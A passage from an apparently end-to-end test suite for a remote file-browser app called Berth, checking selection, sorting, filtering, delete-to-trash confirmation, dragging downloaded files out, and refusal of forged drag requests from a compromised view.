            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', bubbles: true }))`);
            const afterArrow = await chosenNow();
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowDown', shiftKey: true, bubbles: true }))`);
            const afterShift = await chosenNow();
            check('an arrow chooses where it lands, and with Shift it takes everything on the way', afterArrow.length === 1 && afterArrow[0] !== order[0] && afterShift.length === 2 && afterShift.includes(afterArrow[0]!), [afterArrow, afterShift]);
            await press(order[0]!);

            const byName = await names();
            // Folders come first whatever the order is by, and the way up is always the first row.
            // The way up is left out: it is a folder in every order there is, so a check that counted it would
            // say folders come first however the list was really ordered.
            const kinds = (): Promise<string[]> => js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..').map((r) => r.dataset.kind)`);
            const foldersFirstByName = (await kinds()).join(',').startsWith('folder');
            await clickOn('#fb-by-size', front);
            const bySize = await names();
            const sizes = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.bytes))`);
            const biggestFirst = sizes.every((n, i) => i === 0 || sizes[i - 1]! >= n);
            const foldersStillFirst = (await kinds()).join(',').startsWith('folder');
            check('ordering by size puts the biggest file first, keeps folders above files, and asks the box for nothing', bySize.join() !== byName.join() && biggestFirst && foldersStillFirst && JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore), [bySize.slice(0, 5), sizes.slice(0, 5), foldersStillFirst]);
            // The same column again turns it around.
            await clickOn('#fb-by-size', front);
            const smallest = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.bytes))`);
            check('pressing the same column again turns the order around', smallest.every((n, i) => i === 0 || smallest[i - 1]! <= n) && smallest.length === sizes.length, [smallest.slice(0, 5)]);
            // Ordered by when it changed, the rows say when: an order with nothing on screen to read it
            // against is an order a person has to take on trust.
            await clickOn('#fb-by-changed', front);
            const saysWhen = await js<number>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.name !== '..' && (r.querySelector('.fb-size')?.textContent ?? '') !== '').length`);
            const times = await js<number[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => Number(r.dataset.changed))`);
            check('ordered by when it changed, the newest is first and every row says when', times.every((n, i) => i === 0 || times[i - 1]! >= n) && saysWhen > 0, [times.slice(0, 4), saysWhen]);
            await clickOn('#fb-by-name', front);
            check('and the order goes back to the name', (await names()).join() === byName.join(), [(await names()).slice(0, 5), byName.slice(0, 5)]);
            // ---- Finding something in this folder ----
            //
            // A glyph beside Name, not a row of its own (his, 2026-11-18 night, and again on 2026-11-19). It
            // is not there until it is asked for, which is the whole point: a field that sits there all day
            // costs a row of files for a thing he does for a few seconds at a time.
            const fieldShown = (): Promise<boolean> => js<boolean>(front.view, `(() => { const f = document.querySelector('.fb-find'); return !!f && !f.hidden; })()`);
            check('the find field is not there until it is asked for', !(await fieldShown()) && (await has('#fb-find-open', front)), await fieldShown());
            await clickOn('#fb-find-open', front);
            await sleep(150);
            const opened = await fieldShown();
            const inHand = await js<string>(front.view, `document.activeElement?.id ?? ''`);
            check('the glyph beside Name opens it, with the hand already in it', opened && inHand === 'fb-find', [opened, inHand]);
            // Narrowing the list hides rows and nothing else: the folder is still the whole folder, the count
            // says what is hidden, and the box is asked for nothing.
            await js(front.view, `(document.getElementById('fb-find').value = 'log', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            const narrowed = await names();
            const saidHidden = (await foot()).includes('hidden by the filter');
            check('narrowing the list shows only what is being looked for, says how many are hidden, and asks the box for nothing', narrowed.length < byName.length && narrowed.filter((n) => n !== '..').every((n) => n.toLowerCase().includes('log')) && saidHidden && JSON.stringify(ctx.filesAsked()) === JSON.stringify(asksBefore), [narrowed, saidHidden]);
            // Nothing matches: the pane says so rather than looking like an empty folder.
            await js(front.view, `(document.getElementById('fb-find').value = 'zzzz-nothing', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            const saidNone = await until(() => has('#fb-none-match', front), 5000);
            const stillHas = (await js<string>(front.view, `document.getElementById('fb-none-match')?.textContent ?? ''`)).includes('hidden by the filter');
            check('a filter that matches nothing says so, and says the folder is not empty', saidNone && stillHas && !(await has('#fb-empty', front)), [saidNone, stillHas]);
            // Escape closes it and clears it in one, which is the way out a person reaches for first, and a
            // filter still on behind a closed field is a folder that looks empty for no reason he can see.
            await js(front.view, `document.getElementById('fb-find')?.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true }))`);
            const shut = await until(async () => !(await fieldShown()), 5000);
            const back = await until(async () => (await names()).join() === byName.join(), 5000);
            check('Escape closes it and gives the whole folder back, with nothing left filtering behind it', shut && back, [shut, back]);
            // And it opens again as empty as it closed.
            await clickOn('#fb-find-open', front);
            await sleep(150);
            check('and it opens again holding nothing', (await js<string>(front.view, `document.getElementById('fb-find')?.value ?? 'x'`)) === '', '');

            // ---- What is chosen is what comes over. ----
            // Choosing five and bringing one over is the same broken promise the delete had, in the other
            // direction. What is counted is the transfer lines the press starts, not whether the file ended
            // up on the PC: a press on a row already fetches it so it can be dragged, and that fetch never
            // becomes a transfer line. A probe that asked "is it here" read yes whatever the press did.
            {
              const small = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file' && Number(r.dataset.bytes) > 0 && Number(r.dataset.bytes) < 100000).map((r) => r.dataset.name)`);
              const two = small.slice(0, 2);
              check('there are two small files to bring over', two.length === 2, small);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${two[0]}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0 }))`);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${two[1]}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0, ctrlKey: true }))`);
              const linesBefore = await js<number>(front.view, `document.querySelectorAll('#fb-moving .fb-moving-one').length`);
              await js(front.view, `document.getElementById('fb-list').focus()`);
              await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 's', ctrlKey: true, bubbles: true }))`);
              const bothNamed = await until(async () => { const said = await js<string>(front.view, `document.getElementById('fb-moving')?.textContent ?? ''`); return two.every((n) => said.includes(n)); }, 25_000);
              const lines = await js<string>(front.view, `document.getElementById('fb-moving')?.textContent ?? ''`);
              check(`one press starts a transfer for every file chosen, not for the one the keyboard stands on: ${two.join(' and ')}`, bothNamed && linesBefore >= 0, [two, lines.slice(0, 160)]);
              check('and with two of them here, the line that drags them out together is there', await until(() => has('#fb-drag-all', front), 15_000), '');
            }
            // ---- The path knows the way up. ----
            // The caret beside the path already opens the folders this tab has been in. This is the other
            // half, the folders this one is inside, which is how a path bar is used for changing folders.
            // What is deliberately not in it: anything that types into his shell.
            const pathAt = await js<string>(front.view, `document.querySelector('.fb-path')?.title ?? ''`);
            await js(front.view, `document.querySelector('.fb-path').dispatchEvent(new MouseEvent('click', { bubbles: true, clientX: 40, clientY: 40 }))`);
            await sleep(160);
            const upFolders = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one .fb-menu-words')].map((w) => w.textContent)`);
            const wantUp: string[] = [];
            for (let f = pathAt.slice(0, pathAt.lastIndexOf('/')); f !== ''; f = f.slice(0, f.lastIndexOf('/'))) wantUp.push(f === '' ? '/' : f);
            check(`pressing the path offers every folder it is inside: ${upFolders.join(', ')}`, wantUp.length > 0 && wantUp.every((f) => upFolders.includes(f)) && upFolders.includes('Copy this folder\u2019s path'), [upFolders, wantUp]);
            check('and nothing in it types into his shell', !upFolders.some((w) => /terminal|shell|cd /i.test(w)), upFolders);
            // Pressing one of them goes there.
            const goUpTo = wantUp[0]!;
            await js(front.view, `[...document.querySelectorAll('#fb-menu .fb-menu-one')].find((b) => b.querySelector('.fb-menu-words').textContent === ${JSON.stringify(goUpTo)}).click()`);
            check(`and pressing one goes there: ${goUpTo}`, await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.title ?? ''`)) === goUpTo, 10_000), await js<string>(front.view, `document.querySelector('.fb-path')?.title ?? ''`));
            await clickOn('#fb-back', front);
            await until(async () => (await js<string>(front.view, `document.querySelector('.fb-path')?.title ?? ''`)) === pathAt, 10_000);

            // ---- What is chosen is what the delete takes. ----
            // #111 gave the list a selection and the delete went on acting on the one row the keyboard stood
            // on, while the foot counted five. A delete that takes one of five, or takes five when the dialog
            // named one, is the worst thing this app could do, so the dialog names every one of them.
            const chooseThese = async (which: string[]): Promise<void> => {
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${which[0]}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0 }))`);
              for (const n of which.slice(1)) await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="${n}"]').dispatchEvent(new MouseEvent('mousedown', { bubbles: true, button: 0, ctrlKey: true }))`);
            };
            const here = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].filter((r) => r.dataset.kind === 'file').map((r) => r.dataset.name)`);
            const three = here.slice(0, 3);
            check('there are three files to take', three.length === 3, here);
            await chooseThese(three);
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 'Delete', bubbles: true }))`);
            await until(async () => (await js<number>(front.view, `document.getElementById('fb-ask-delete') ? 1 : 0`)) === 1, 4000);
            const askHead = await js<string>(front.view, `document.querySelector('#fb-ask-delete .fb-ask-head')?.textContent ?? ''`);
            const askNames = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-ask-names .fb-ask-name')].map((n) => n.title || n.textContent)`);
            check(`the dialog says how many go and names every one of them: ${askHead}`, askHead === 'Delete 3 things?' && JSON.stringify(askNames.slice().sort()) === JSON.stringify(three.slice().sort()), [askHead, askNames, three]);
            // Keeping them keeps all three, and keeps them chosen.
            await clickOn('#fb-ask-keep', front);
            await sleep(200);
            const afterKeep = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`);
            check('keeping them keeps every one', three.every((n) => afterKeep.includes(n)), [three, afterKeep]);
            // And deleting them takes all three, to the trash, and says so as a count.
            await chooseThese(three);
            await js(front.view, `document.getElementById('fb-list').dispatchEvent(new KeyboardEvent('keydown', { key: 'Delete', bubbles: true }))`);
            await until(async () => (await js<number>(front.view, `document.getElementById('fb-ask-go') ? 1 : 0`)) === 1, 4000);
            await clickOn('#fb-ask-go', front);
            const allGone = await until(async () => { const n = await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`); return three.every((x) => !n.includes(x)); }, 15_000);
            const saidCount = await until(async () => (await foot()).includes('in the trash'), 15_000) ? await foot() : await foot();
            check(`all three go, and the foot says the count rather than one name: ${saidCount.includes('3 things are in the trash') ? '3 things are in the trash' : saidCount.slice(0, 80)}`, allGone && saidCount.includes('3 things are in the trash'), [allGone, saidCount.slice(0, 120)]);
            // And they are really in the trash on the box, each of them, not gone from it.
            const inBin = await lab.tell('read var/log/.berth-trash');
            check('and the box itself holds a trash with them in it', inBin !== undefined, inBin);

            // And moving to another folder does not carry the filter into it.
            await clickOn('#fb-find-open', front);
            await sleep(150);
            await js(front.view, `(document.getElementById('fb-find').value = 'log', document.getElementById('fb-find').dispatchEvent(new Event('input', { bubbles: true })))`);
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('log'), 10_000);
            const cleared = await js<string>(front.view, `document.getElementById('fb-find')?.value ?? 'x'`);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await names()).includes('syslog'), 10_000);
            check('a filter belongs to the folder it was typed in, and does not follow you out of it', cleared === '', cleared);
          }
          // Dragging a file out of the window. The drag itself belongs to Windows and is his PC's to prove; what
          // is proven here is everything around it: which files a tab may drag, that a view names a number and
          // never a path, that another tab's file and a made-up number are refused, and that a tab closing takes
          // what it could drag with it (plan B4.5, B2.7).
          {
            const foot = (): Promise<string> => js<string>(front.view, `(document.getElementById('fb-moving')?.textContent ?? '') + (document.getElementById('fb-foot')?.textContent ?? '')`);
            let handedOver = '';
            ctx.watchDrags((file) => void (handedOver = file));
            // This one file has not been brought over, so its row is not draggable. A file of its own is made
            // for it, because a file another probe has already pressed would be draggable before this begins
            // (a press fetches a small file: plan B4.5) and this probe would then be about nothing.
            await lab.tell('bigfile /var/log/dragme.log 40000');
            // The folder is listed again so the new file is in it: the pane shows what it was given, and a file
            // made behind its back is not in that.
            await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
            await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
            const itIsThere = await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('dragme.log'), 10_000);
            check('the lab box made a file of this probe\'s own, and the pane lists it', itIsThere, itIsThere);
            const canDragBefore = ctx.canDrag(front.id);
            const rowBefore = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') === 'true'`);
            // Bring it over, and it becomes draggable: a line in the strip and the row itself.
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-bring')?.click()`);
            const there = await until(async () => (await foot()).includes('is in the download folder'), 30_000);
            const rowNow = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"].fb-on-pc')?.getAttribute('draggable') === 'true'`), 5000);
            const lineNow = await js<boolean>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one[draggable="true"]')].some((e) => (e.textContent ?? '').includes('dragme.log'))`);
            check('a file this tab brought over becomes draggable, from its line and from its row; before it was not', there && rowNow && lineNow && !rowBefore && ctx.canDrag(front.id) === canDragBefore + 1, [there, rowNow, lineNow, rowBefore, ctx.canDrag(front.id) - canDragBefore]);
            // The press hands main the number of the ask, and main hands the system the file it decided on. The
            // row is pressed rather than a line of the strip, because the row names one file and no other.
            const asked = ctx.dragsAsked();
            await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
            const handed = await until(() => handedOver !== '', 5000);
            const saidSo = await until(async () => (await foot()).includes('being dragged out'), 5000);
            // What was handed over is the file itself: in the download folder, under the name main gave it
            // (which is not always the box's, B4.2), and holding what the box holds.
            const itsBytes = await readFile(handedOver).catch(() => Buffer.alloc(0));
            const onTheBox = await lab.tell('hashof var/log/dragme.log');
            const same = createHash('sha256').update(itsBytes).digest('hex') === onTheBox['sha256'];
            check('the press hands main a number, and main hands the system the file it chose: in the download folder, under the name it gave it, holding what the box holds', handed && saidSo && handedOver.startsWith(ctx.downloads) && path.basename(handedOver).startsWith('dragme.log') && same && ctx.dragsAsked() === asked + 1, [handedOver.replace(ctx.downloads, '<downloads>'), saidSo, same]);
            // Several at once. A second file is brought over, and the strip then offers one line that stands
            // for both: pressing it hands main both numbers, and main hands the system both files.
            {
              await lab.tell('bigfile /var/log/dragme-two.log 24000');
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('dragme-two.log'), 10_000);
              // Listing a folder clears the lines of what has finished, which is the pane's own doing and
              // right: so both files are brought over after that listing, not one before it and one after.
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-bring')?.click()`);
              await until(async () => js<boolean>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one[draggable="true"]')].some((e) => (e.textContent ?? '').includes('dragme.log'))`), 30_000);
              const only = await js<boolean>(front.view, `document.getElementById('fb-drag-all') !== null`);
              check('with one file here there is no line for dragging several: the file\u2019s own line already does it', !only, [only, await foot()]);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme-two.log"] .fb-bring')?.click()`);
              const both = await until(async () => js<boolean>(front.view, `document.getElementById('fb-drag-all')?.getAttribute('draggable') === 'true'`), 30_000);
              check('with two here the strip offers one line that stands for both, and it is the handle', both, await foot());
              handedOver = '';
              const askedBefore = ctx.dragsAsked();
              await js(front.view, `document.getElementById('fb-drag-all')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              const handedBoth = await until(() => handedOver !== '', 6000);
              const names = handedOver.split('\n');
              check('dragging that line hands the system both files, each the one main decided on', handedBoth && names.length === 2 && names.every((f) => f.startsWith(ctx.downloads)) && names.some((f) => path.basename(f).startsWith('dragme') && !path.basename(f).startsWith('dragme-two')) && names.some((f) => path.basename(f).startsWith('dragme-two.log')) && ctx.dragsAsked() === askedBefore + 1, [names.map((f) => f.replace(ctx.downloads, '<downloads>')), ctx.dragsAsked() - askedBefore]);
              // One of several leaving the download folder between the line being drawn and the hand
              // reaching for it. The rest still go, and the one that went is said: a drag that quietly
              // hands over one of two is a drag he would believe was two.
              {
                const two = names.find((f) => path.basename(f).startsWith('dragme-two'))!;
                const one = names.find((f) => f !== two)!;
                await rm(two, { force: true });
                handedOver = '';
                const couldDrag = ctx.canDrag(front.id);
                const askedAgain = ctx.dragsAsked();
                await js(front.view, `document.getElementById('fb-drag-all')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
                const handedOne = await until(() => handedOver !== '', 6000);
                const saidHowMany = await until(async () => (await text('#status')).includes('Dragging 1 of 2'), 6000);
                const saidWhich = await until(async () => (await foot()).includes('not in the download folder any more'), 6000);
                check(
                  'one of several gone from the download folder: the rest are handed over, that one is said, and its line stops offering it',
                  handedOne && handedOver === one && saidHowMany && saidWhich && ctx.canDrag(front.id) === couldDrag - 1 && ctx.dragsAsked() === askedAgain + 1,
                  [handedOver.replace(ctx.downloads, '<downloads>'), await text('#status'), saidWhich, ctx.canDrag(front.id) - couldDrag],
                );
              }
              // The row's own file is put back as the last thing handed over, because what comes next is
              // about that one file leaving the download folder.
              handedOver = '';
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              await until(() => handedOver !== '', 6000);
            }
            // The download folder is his, so a file can be moved or deleted between landing and the hand
            // reaching for it. Main looks for it again before handing it over, and the window says so.
            {
              const gone = handedOver;
              handedOver = '';
              await rm(gone, { force: true });
              const askedBefore = ctx.dragsAsked();
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              const toldHim = await until(async () => (await foot()).includes('not in the download folder any more'), 6000);
              const rowStopped = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') !== 'true'`), 6000);
              check('a file that has left the download folder is not handed to the system: the window says so and stops offering it', toldHim && rowStopped && handedOver === '' && ctx.dragsAsked() === askedBefore, [toldHim, rowStopped, handedOver, ctx.dragsAsked() - askedBefore]);
            }
            // A download that failed leaves nothing to drag: there is no file to hand over, so the row and the
            // line must not offer one.
            {
              // The strip is not asked whether this failed: an earlier probe's line says the same words, and a
              // probe that reads them would pass however this was written. What is asked is main's own count of
              // what this tab may drag, which cannot be anything but this download's own answer.
              const couldDrag = ctx.canDrag(front.id);
              const lines = (): Promise<number> => js<number>(front.view, `document.querySelectorAll('#fb-moving .fb-moving-one').length`);
              const linesBefore = await lines();
              await lab.tell('failreads 1');
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-bring')?.click()`);
              const went = await until(async () => (await lines()) > linesBefore, 10_000);
              const settled = await until(async () => (await js<number>(front.view, `[...document.querySelectorAll('#fb-moving .fb-moving-one')].filter((e) => e.querySelector('.fb-stop')).length`)) === 0, 40_000);
              await lab.tell('failreads 0');
              const offered = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"]')?.getAttribute('draggable') === 'true'`);
              check('a download that failed leaves nothing to drag', went && settled && !offered && ctx.canDrag(front.id) === couldDrag, [went, settled, offered, ctx.canDrag(front.id) - couldDrag]);
            }
            // The one thing Berth does on a box without being asked: taking out of the trash what has been
            // there longer than the box keeps things. It waited on a folder the box had not yet named, and a
            // tab opened at the account's home asks for ".", which is not a path, so for such a tab it was
            // refused and quietly never happened at all. A tab of its own is opened at the home to prove it.
            {
              const asksBefore = ctx.filesAsked()['empty'] ?? 0;
              const home = front.box ? ctx.openTab(front.box.id, '') : null;
              if (home) {
                await until(() => home.engine.link.phase === 'up', 20_000);
                const emptied = await until(() => (ctx.filesAsked()['empty'] ?? 0) > asksBefore, 25_000);
                // Asked with a path, not with ".": the engine refuses a name that is not a path, so an ask
                // counted is not an ask that did anything. This is what the fault was.
                const askedWith = ctx.filesAskedWhere()['empty'] ?? '';
                check('a tab opened at the account\u2019s own home still empties what is too old from the trash, asked with the folder the box named', emptied && askedWith.startsWith('/'), [(ctx.filesAsked()['empty'] ?? 0) - asksBefore, askedWith]);
                ctx.closeTab(home.id);
              }
            }
            // A transfer whose link dies under it must end, rather than leaving a line with a speed and a
            // time left for ever, a Stop that does nothing, and a name that is never free again. A tab of
            // its own is used and then closed, because what proves it is killing that tab's engine.
            {
              const doomed = front.box ? ctx.openTab(front.box.id, '') : null;
              if (doomed) {
                await until(() => doomed.engine.link.phase === 'up', 20_000);
                await lab.tell('bigfile /var/log/longone.log 40000000');
                await js(doomed.view, `window.tabPort.files({ id: 501, do: 'get', path: '/var/log/longone.log' })`);
                const begun = await until(() => ctx.transfersOn(doomed.id) > 0, 20_000);
                const pid = doomed.engine.pid;
                const killed = begun && signal(pid, 'SIGKILL');
                const cleared = await until(() => ctx.transfersOn(doomed.id) === 0, 20_000);
                check('a transfer whose link dies under it is ended by main, not left running for ever', begun && killed && cleared, [begun, killed, cleared, ctx.transfersOn(doomed.id)]);
                ctx.closeTab(doomed.id);
              }
            }
            // A number this tab never had, another tab's number, and a number that is not one: each is dropped
            // and nothing is handed over. This is the whole of what a taken-over view could try.
            handedOver = '';
            const droppedBefore = ctx.dropped();
            // Counted from here, not from far above: what this probe says is that none of these asks caused
            // a drag, and a count taken before other drags would be saying something else as well.
            const dragsBefore = ctx.dragsAsked();
            const other = [...ctx.tabs.values()].find((t) => t.id !== front.id);
            await js(front.view, `(window.tabPort.drag(987654), window.tabPort.drag(0), window.tabPort.drag(-1), window.tabPort.drag('a'))`);
            if (other) await js(other.view, `window.tabPort.drag(1)`);
            await sleep(400);
            refusedByTheLock += other ? 5 : 4;
            check('a view can drag out nothing it was not given: every made-up number is dropped and nothing is handed over', handedOver === '' && ctx.dropped() === droppedBefore + (other ? 5 : 4) && ctx.dragsAsked() === dragsBefore, [handedOver, ctx.dropped() - droppedBefore, ctx.dragsAsked() - dragsBefore]);
            // A tab that closes takes what it could drag with it, so a number cannot outlive its tab. The spare
            // tab has to bring a file over for this to be about anything: a tab that never fetched one would
            // hold nothing either way, and the probe would pass however the closing was written.
            const spare = ctx.openTab(front.box!.id, 'logs')!;
            await until(() => spare.engine.link.phase === 'up', 25_000);
            await until(async () => (await js<number>(spare.view, `document.querySelectorAll('#fb-list .fb-row').length`)) > 0, 20_000);
            await js(spare.view, `document.querySelector('#fb-list .fb-row[data-name="dragme.log"] .fb-bring')?.click()`);
            const spareGotOne = await until(() => ctx.canDrag(spare.id) > 0, 30_000);
            const hadSpare = ctx.canDrag(spare.id);
            const hadFront = ctx.canDrag(front.id);
            ctx.closeTab(spare.id);
            check('a tab that closes takes what it could drag with it, and leaves every other tab whole', spareGotOne && hadSpare > 0 && ctx.canDrag(spare.id) === 0 && ctx.canDrag(front.id) === hadFront, [spareGotOne, hadSpare, ctx.canDrag(spare.id), hadFront, ctx.canDrag(front.id)]);
            // A small file nobody has brought over: a press on its row fetches it, into Berth's own folder and
            // never his, so that a drag begun a moment later has something to carry (plan B4.5).
            {
              await lab.tell('bigfile /var/log/carry-me.txt 2000');
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('carry-me.txt'), 10_000);
              const notYet = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.getAttribute('draggable') === 'true'`);
              const inDownloads = (await readdir(ctx.downloads).catch(() => [] as string[])).length;
              handedOver = '';
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              const ready = await until(async () => js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.getAttribute('draggable') === 'true'`), 30_000);
              const saidReady = (await foot()).includes('ready to drag');
              // It is carried, not downloaded: his download folder is untouched, and what is handed over is a
              // copy in Berth's own folder holding exactly what the box holds.
              const stillSoMany = (await readdir(ctx.downloads).catch(() => [] as string[])).length;
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new DragEvent('dragstart', { bubbles: true, cancelable: true }))`);
              const handed = await until(() => handedOver !== '', 5000);
              const its = createHash('sha256').update(await readFile(handedOver).catch(() => Buffer.alloc(0))).digest('hex');
              const onTheBox = await lab.tell('hashof var/log/carry-me.txt');
              check('a press on a small file fetches it so it can be dragged, into Berth\'s own folder and not his download folder', !notYet && ready && saidReady && handed && !handedOver.startsWith(ctx.downloads) && its === onTheBox['sha256'] && stillSoMany === inDownloads, [notYet, ready, saidReady, handedOver.replace(ctx.downloads, '<downloads>'), its === onTheBox['sha256'], inDownloads, stillSoMany]);
              // A second press changes nothing: it is already here, so no second fetch is started.
              const held = ctx.canDrag(front.id);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="carry-me.txt"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await sleep(600);
              const fetchingAgain = (await foot()).includes('Fetching carry-me');
              check('a file already here is not fetched again by another press', !fetchingAgain && ctx.canDrag(front.id) === held, [fetchingAgain, ctx.canDrag(front.id) - held]);
              await lab.tell('forget var/log/carry-me.txt');
            }
            // A file too big to pick up by hand is not fetched by a press: the window says so and leaves it to
            // the download button, rather than quietly fetching hundreds of megabytes because a row was touched.
            {
              await lab.tell('bigfile /var/log/heavy.bin 5000000');
              await js(front.view, `document.getElementById('fb-up')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('log'), 10_000);
              await js(front.view, `document.querySelector('[data-name="log"]')?.dispatchEvent(new MouseEvent('dblclick', { bubbles: true }))`);
              await until(async () => (await js<string[]>(front.view, `[...document.querySelectorAll('#fb-list .fb-row')].map((r) => r.dataset.name)`)).includes('heavy.bin'), 10_000);
              const couldDrag = ctx.canDrag(front.id);
              await js(front.view, `document.querySelector('#fb-list .fb-row[data-name="heavy.bin"]')?.dispatchEvent(new MouseEvent('mousedown', { bubbles: true }))`);
              await sleep(1500);
              const offered = await js<boolean>(front.view, `document.querySelector('#fb-list .fb-row[data-name="heavy.bin"]')?.getAttribute('draggable') === 'true'`);
              check('a file too big to pick up by hand is not fetched by a press, and is left to the download button', !offered && ctx.canDrag(front.id) === couldDrag, [offered, ctx.canDrag(front.id) - couldDrag]);
              // And the limit is main's, not the window's. A view that has been taken over does not press rows:
              // it asks. So the ask is made directly, past everything the window would have checked first.
              await js(front.view, `window.tabPort.files({ id: 500001, do: 'grab', path: '/var/log/heavy.bin' })`);
              const refused = await until(async () => (await foot()).includes('too big to pick up by hand'), 20_000);
              check('the size a press may fetch is main\'s own limit: an ask that goes straight to it is refused', refused && ctx.canDrag(front.id) === couldDrag, [refused, ctx.canDrag(front.id) - couldDrag]);
              await lab.tell('forget var/log/heavy.bin');
            }
            ctx.watchDrags(null);
            await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${front.id} })`);
            await until(() => ctx.shellState().active === front.id, 3000);
          }
          // The three glyph buttons beside the path are gone (his, 2026-11-18 night), so what they did is asked
          // for under the right button on the empty part of the folder, where the thing being acted on is what
          // was pressed. One way in, used by every probe below that used to press one of them.
          const fromTheFolderMenu = async (line: string, settle = 150): Promise<void> => {
            await js(front.view, `(() => {
              const list = document.getElementById('fb-list');
              const r = list.getBoundingClientRect();
              list.dispatchEvent(new MouseEvent('contextmenu', { bubbles: true, clientX: Math.round(r.left + 30), clientY: Math.round(r.bottom - 12) }));
